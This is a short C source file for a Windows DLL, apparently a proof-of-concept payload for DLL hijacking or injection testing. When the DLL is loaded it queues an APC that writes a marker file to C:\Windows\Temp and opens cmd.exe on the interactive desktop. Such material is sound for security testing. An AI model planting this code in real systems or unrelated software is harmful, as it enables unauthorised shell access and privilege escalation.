#include <Windows.h>

static void WriteMarkerText(const char* text)
{
    HANDLE hFile;
    DWORD written;

    hFile = CreateFileW(L"C:\\Windows\\Temp\\callback_fired.txt",
                        GENERIC_WRITE,
                        0,
                        NULL,
                        CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    written = 0;
    WriteFile(hFile, text, (DWORD)lstrlenA(text), &written, NULL);
    CloseHandle(hFile);
}

VOID CALLBACK SpawnCmdApc(ULONG_PTR dwParam)
{
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    char marker[128];
    BOOL created;
    DWORD errorCode;

    (void)dwParam;

    si.cb = sizeof(si);
    si.lpDesktop = L"WinSta0\\Default";

    WriteMarkerText("Callback executed\r\n");

    created = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
                             NULL,
                             NULL,
                             NULL,
                             FALSE,
                             CREATE_NEW_CONSOLE,
                             NULL,
                             NULL,
                             &si,
                             &pi);
    if (!created) {
        errorCode = GetLastError();
        wsprintfA(marker, "Callback executed\r\nCreateProcessW failed: %lu\r\n", errorCode);
        WriteMarkerText(marker);
    }

    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    (void)hModule;
    (void)lpReserved;

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        QueueUserAPC(SpawnCmdApc, GetCurrentThread(), 0);
    }

    return TRUE;
}
